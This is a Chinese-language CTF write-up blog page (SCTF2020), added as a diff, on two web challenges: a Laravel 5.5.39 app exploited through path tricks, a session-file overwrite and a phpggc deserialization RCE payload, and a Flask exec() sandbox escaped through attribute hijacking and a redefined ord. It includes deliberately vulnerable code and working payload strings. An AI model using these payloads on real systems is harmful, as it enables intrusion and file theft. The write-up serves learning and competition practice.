@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>SCTF2020复现记录 - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=writeup>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">SCTF2020复现记录</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BestLanguage"><span class="toc-text">BestLanguage</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#预期"><span class="toc-text">预期</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nginx特性"><span class="toc-text">nginx特性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#trick1-写文件"><span class="toc-text">trick1 写文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#trick2-移动文件"><span class="toc-text">trick2 移动文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#laravel-session反序列化"><span class="toc-text">laravel session反序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#非预期"><span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#非预期2"><span class="toc-text">非预期2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pysandbox"><span class="toc-text">pysandbox</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#app-static-folder"><span class="toc-text">app.static_folder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#函数劫持"><span class="toc-text">函数劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lambda表达式劫持ord"><span class="toc-text">lambda表达式劫持ord</span></a></li></ol></li></ol></li></ol>
+
+  <div class="post-content">
+    <p>比赛的时候忙着最优化，做了个CloudDisk就溜了，不过打了也是丢人…</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="BestLanguage"><a href="#BestLanguage" class="headerlink" title="BestLanguage"></a>BestLanguage</h2><p>给了一个laravel，版本为5.5.39</p>
+<ul>
+<li>web.php中的路由</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'/'</span>,<span class="string">"IndexController@init"</span>);</span><br><span class="line">Route::post(<span class="string">'/rm'</span>,<span class="string">"IndexController@rm"</span>);</span><br><span class="line">Route::get(<span class="string">'/tmp/&#123;filename&#125;'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($filename)</span> </span>&#123;</span><br><span class="line">    readfile(<span class="string">"/var/tmp/"</span>.$filename);</span><br><span class="line">&#125;)-&gt;where(<span class="string">'filename'</span>, <span class="string">'(.*)'</span>);</span><br><span class="line">Route::post(<span class="string">'/upload'</span>,<span class="string">"IndexController@upload"</span>);</span><br><span class="line">Route::get(<span class="string">'/move/log/&#123;filename&#125;'</span>, <span class="string">'IndexController@moveLog'</span>)-&gt;where(<span class="string">'filename'</span>, <span class="string">'(.*)'</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>IndexController.php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span> &amp;&amp; strpos($_SERVER[<span class="string">"REMOTE_ADDR"</span>],<span class="string">"192.168."</span>) !== <span class="number">0</span> &amp;&amp; strpos($_SERVER[<span class="string">"REMOTE_ADDR"</span>],<span class="string">"10."</span>) !== <span class="number">0</span> )  &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"admin only"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>])))&#123;</span><br><span class="line">            mkdir(<span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rm</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($_POST[<span class="string">"filename"</span>], <span class="string">'../'</span>) !== <span class="keyword">false</span>) <span class="keyword">die</span>(<span class="string">"???"</span>);</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_dir(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]))&#123;</span><br><span class="line">                rmdir(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"rmdir"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                unlink(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"unlink"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strpos($_POST[<span class="string">"filename"</span>], <span class="string">'../'</span>) !== <span class="keyword">false</span>) <span class="keyword">die</span>(<span class="string">"???"</span>);</span><br><span class="line">        file_put_contents(<span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">"/"</span>.$_POST[<span class="string">"filename"</span>],base64_decode($_POST[<span class="string">"content"</span>]));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">"/"</span>.$_POST[<span class="string">"filename"</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moveLog</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        $data =date(<span class="string">"Y-m-d"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data))&#123;</span><br><span class="line">            mkdir(storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data);</span><br><span class="line">        &#125;</span><br><span class="line">        $opts = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'http'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'method'</span>=&gt;<span class="string">"GET"</span>,</span><br><span class="line">                <span class="string">'timeout'</span>=&gt;<span class="number">1</span>,<span class="comment">//单位秒</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $content = file_get_contents(<span class="string">"http://127.0.0.1/tmp/"</span>.md5(<span class="string">'127.0.0.1'</span>).<span class="string">"/"</span>.$filename,<span class="keyword">false</span>,stream_context_create($opts));</span><br><span class="line">        file_put_contents(storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data.<span class="string">"/"</span>.$filename,$content);</span><br><span class="line">        <span class="keyword">echo</span> storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data.<span class="string">"/"</span>.$filename;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><h4 id="nginx特性"><a href="#nginx特性" class="headerlink" title="nginx特性"></a>nginx特性</h4><p><code>/tmp/{filename}</code>路由看起来可以直接读文件，<code>/tmp/../../flag</code>试试</p>
+<p><img src="/images/nginx_400.JPG" alt=""></p>
+<p>这实际上是nginx的一个特性，nginx会将url中的<code>../</code>转化为绝对路径，并判断其是否超过了url中的根目录，超过了则返回http 400</p>
+<p>借用下官方writeup的图</p>
+<p><img src="/images/nginx_path.JPG" alt=""></p>
+<h4 id="trick1-写文件"><a href="#trick1-写文件" class="headerlink" title="trick1 写文件"></a>trick1 写文件</h4><p>继续看其他路由，可以发现：</p>
+<ul>
+<li><code>upload()</code>会将文件写到<code>&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;/&quot;</code>下，但<code>md5($_SERVER[&quot;REMOTE_ADDR&quot;])</code>需要在<code>init()</code>中创建</li>
+<li>然而<code>init()</code>中会验证ip是否为内网ip…看起来需要一个ssrf？</li>
+<li>唯一跟ssrf沾点边的就是<code>moveLog()</code>中的</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = file_get_contents(<span class="string">"http://127.0.0.1/tmp/"</span>.md5(<span class="string">'127.0.0.1'</span>).<span class="string">"/"</span>.$filename,<span class="keyword">false</span>,stream_context_create($opts));</span><br></pre></td></tr></table></figure>
+
+<p>可这真的能够访问到<code>/</code>吗…</p>
+<ul>
+<li>如果不用<code>upload()</code>去写文件的话，那<code>moveLog()</code>也就无法使用了</li>
+</ul>
+<p>实际上这里需要用一个php文件操作的trick，文件名<code>xxx/.</code>时会认为是<code>xxx</code></p>
+<p>因此访问<code>filename=.</code>即可在<code>/var/tmp/</code>下写文件，文件名为<code>md5($_SERVER[&quot;REMOTE_ADDR&quot;])</code></p>
+<p>这个trick的原理和<code>xxx/../</code>是一样的:</p>
+<ul>
+<li>php读取、写入文件，都会调用<code>php_stream_open_wrapper_ex</code>来打开流<ul>
+<li><code>php_stream_open_wrapper_ex</code>最后会使用<code>tsrm_realpath</code>函数来将filename给标准化成一个绝对路径。</li>
+</ul>
+</li>
+<li>而判断文件存在、重命名、删除文件等操作则无需打开文件流，无法使用这个trick</li>
+</ul>
+<h4 id="trick2-移动文件"><a href="#trick2-移动文件" class="headerlink" title="trick2 移动文件"></a>trick2 移动文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$content = file_get_contents(<span class="string">"http://127.0.0.1/tmp/"</span>.md5(<span class="string">'127.0.0.1'</span>).<span class="string">"/"</span>.$filename,<span class="keyword">false</span>,stream_context_create($opts));</span><br><span class="line">file_put_contents(storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data.<span class="string">"/"</span>.$filename,$content);</span><br></pre></td></tr></table></figure>
+
+<p>写入文件后自然会想到用<code>moveLog()</code>移动文件，但此时文件名是<code>md5($_SERVER[&quot;REMOTE_ADDR&quot;])</code>，可以利用url和路径的差异，使用<code>?</code>或<code>#</code>截断url，比如</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../ee3973488c12ec9231af25c6e84309d3?xxx/../<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<p>会将<code>/var/tmp/ee3973488c12ec9231af25c6e84309d3</code>的内容写到<code>storage_path(&quot;logs&quot;)/test</code></p>
+<p>还是因为nginx特性的原因，只能将文件写到<code>storage_path(&quot;logs&quot;)</code>下</p>
+<h4 id="laravel-session反序列化"><a href="#laravel-session反序列化" class="headerlink" title="laravel session反序列化"></a>laravel session反序列化</h4><p><code>storage_path(&quot;logs&quot;)/framework/sessions/</code>下存储了laravel的session文件，如果能覆盖的话可以通过session反序列化拿到flag</p>
+<p>不过laravel不使用原生的php session，而是自己弄了一套，session文件名可以根据session id和app key得到固定值</p>
+<p>为了防御session固定攻击，laravel每次访问session id都会变…但是session文件名不会变</p>
+<p>题目给出了app key，本地搭建环境，远程使用和本地相同的session id即可保证session文件名相同</p>
+<p>最后的步骤：</p>
+<ul>
+<li>本地搭建环境，记录此时的<code>laravel_session</code>和对应的session文件名</li>
+<li>phpggc生成laravel 5.5.39的反序列化payload</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php .\phpggc  -a Laravel/RCE2 system <span class="string">'cat /flag'</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将<code>laravel_session</code>设置成本地值，将payload base64编码后写入<code>/var/tmp/md5($_SERVER[&quot;REMOTE_ADDR&quot;])</code></li>
+</ul>
+<p><img src="/images/bestlanguage_upload.JPG" alt=""></p>
+<ul>
+<li>覆盖session文件</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/move/log/..%2Fee3973488c12ec9231af25c6e84309d3%3Fxxx%2F..%2F..%2Fframework%2Fsessions%2FXQJBTIU1E9D5imnmUmI1g9tVC4yWDKYYneRb3CUH</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>注意这一步要把session改成别的或删掉，不然session文件会在请求处理后修改回去</li>
+<li><code>XQJBTIU1E9D5imnmUmI1g9tVC4yWDKYYneRb3CUH</code>为本地session文件名</li>
+</ul>
+<ul>
+<li>将session重新设成本地值，任意访问一个路由即可得到flag</li>
+</ul>
+<p><img src="/images/bestlanguage_result.JPG" alt=""></p>
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>CVE-2018-15133直接打</p>
+<h3 id="非预期2"><a href="#非预期2" class="headerlink" title="非预期2"></a>非预期2</h3><p>在<a href="http://phoebe233.cn/index.php/archives/53/#bestlanguage" target="_blank" rel="noopener">http://phoebe233.cn/index.php/archives/53/#bestlanguage</a>看到的</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/tmp/../../flag</span><br></pre></td></tr></table></figure>
+
+<p>多加一个<code>index.php</code>就能绕过nginx的特性了…</p>
+<h2 id="pysandbox"><a href="#pysandbox" class="headerlink" title="pysandbox"></a>pysandbox</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=["POST","GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">security</span><span class="params">()</span>:</span></span><br><span class="line">    secret = request.form[<span class="string">"cmd"</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> secret:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">42</span> &lt;= ord(i) &lt;= <span class="number">122</span>: <span class="keyword">return</span> <span class="string">"error!"</span></span><br><span class="line"></span><br><span class="line">    exec(secret)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"xXXxXXx"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>只允许ascii码42-122的字符，最大的问题就是<code>()</code>没了，无法调用函数</p>
+<h3 id="app-static-folder"><a href="#app-static-folder" class="headerlink" title="app.static_folder"></a>app.static_folder</h3><p>第一种解法就是常规的flask ssti思路。既然无法调用函数，那就从flask的配置入手，将<code>app.static_folder</code>设为<code>/</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=app.static_folder%3Dapp.root_path</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/static/flag</span><br></pre></td></tr></table></figure>
+
+<h3 id="函数劫持"><a href="#函数劫持" class="headerlink" title="函数劫持"></a>函数劫持</h3><p>思路是找到一个参数可控的函数，用<code>xxx=eval</code>将其劫持</p>
+<p>可以添加一个路由显示导入的模块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/info',methods=["POST","GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">()</span>:</span></span><br><span class="line">    modules = sys.modules</span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> modules.items():</span><br><span class="line">        result = result + key + <span class="string">"&lt;br&gt;"</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
+
+<p>官方wp找的是<code>werkzeug.urls.url_parse</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">url_parse</span><span class="params">(url, scheme=None, allow_fragments=True)</span>:</span></span><br></pre></td></tr></table></figure>
+
+<p>因为<code>werkzeug</code>不在当前模块的全局名称空间中，所以要用继承链去访问。用shrine的脚本找一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(obj, max_depth)</span>:</span></span><br><span class="line">    </span><br><span class="line">    visited_clss = []</span><br><span class="line">    visited_objs = []</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">(obj, path=<span class="string">'obj'</span>, depth=<span class="number">0</span>)</span>:</span></span><br><span class="line">        <span class="keyword">yield</span> path, obj</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> depth == max_depth:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, (int, float, bool, str, bytes)):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, type):</span><br><span class="line">            <span class="keyword">if</span> obj <span class="keyword">in</span> visited_clss:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            visited_clss.append(obj)</span><br><span class="line">            print(obj)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> obj <span class="keyword">in</span> visited_objs:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            visited_objs.append(obj)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># attributes</span></span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> dir(obj):</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">'__'</span>) <span class="keyword">and</span> name.endswith(<span class="string">'__'</span>):</span><br><span class="line">                <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span>  (<span class="string">'__globals__'</span>, <span class="string">'__class__'</span>, <span class="string">'__self__'</span>,</span><br><span class="line">                                 <span class="string">'__weakref__'</span>, <span class="string">'__objclass__'</span>, <span class="string">'__module__'</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            attr = getattr(obj, name)</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> visit(attr, <span class="string">'&#123;&#125;.&#123;&#125;'</span>.format(path, name), depth + <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># dict values</span></span><br><span class="line">        <span class="keyword">if</span> hasattr(obj, <span class="string">'items'</span>) <span class="keyword">and</span> callable(obj.items):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> k, v <span class="keyword">in</span> obj.items():</span><br><span class="line">                    <span class="keyword">yield</span> <span class="keyword">from</span> visit(v, <span class="string">'&#123;&#125;[&#123;&#125;]'</span>.format(path, repr(k)), depth)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># items</span></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, (set, list, tuple, frozenset)):</span><br><span class="line">            <span class="keyword">for</span> i, v <span class="keyword">in</span> enumerate(obj):</span><br><span class="line">                <span class="keyword">yield</span> <span class="keyword">from</span> visit(v, <span class="string">'&#123;&#125;[&#123;&#125;]'</span>.format(path, repr(i)), depth)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> visit(obj)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/find',methods=["POST","GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> path, obj <span class="keyword">in</span> search(request,<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">if</span> obj == <span class="string">'werkzeug.urls'</span>:</span><br><span class="line">            <span class="keyword">return</span> path</span><br></pre></td></tr></table></figure>
+
+<p>返回<code>obj.environ[&#39;werkzeug.server.shutdown&#39;].__globals__[&#39;uri_to_iri&#39;].__module__</code>，需要修改一下通过<code>request.environ[&#39;werkzeug.server.shutdown&#39;].__globals__[&#39;uri_to_iri&#39;].__globals__[&#39;url_parse&#39;]</code>访问到<code>werkzeug.urls.url_parse</code></p>
+<p>接着还需要bypass单引号，常见的<code>request.args</code>因为不是jinja2环境用不了，但可以用<code>request</code>的其他可控属性</p>
+<p><img src="/images/pysandbox_hijack.JPG" alt=""></p>
+<p>之后就可以用url代码执行</p>
+<p><img src="/images/pysandbox_%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.JPG" alt=""></p>
+<h3 id="lambda表达式劫持ord"><a href="#lambda表达式劫持ord" class="headerlink" title="lambda表达式劫持ord"></a>lambda表达式劫持ord</h3><p><a href="http://phoebe233.cn/index.php/archives/53/#menu_index_3" target="_blank" rel="noopener">http://phoebe233.cn/index.php/archives/53/#menu_index_3</a>大佬的解法…</p>
+<p>正常情况下lambda表达式是需要空格的，不能绕过过滤，比如</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.ord=<span class="keyword">lambda</span> a:<span class="number">45</span></span><br></pre></td></tr></table></figure>
+
+<p>配合数组参数可以无空格</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.ord=lamdba*a:<span class="number">45</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就可以为所欲为了-_-</p>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2020-07-17</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2025
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
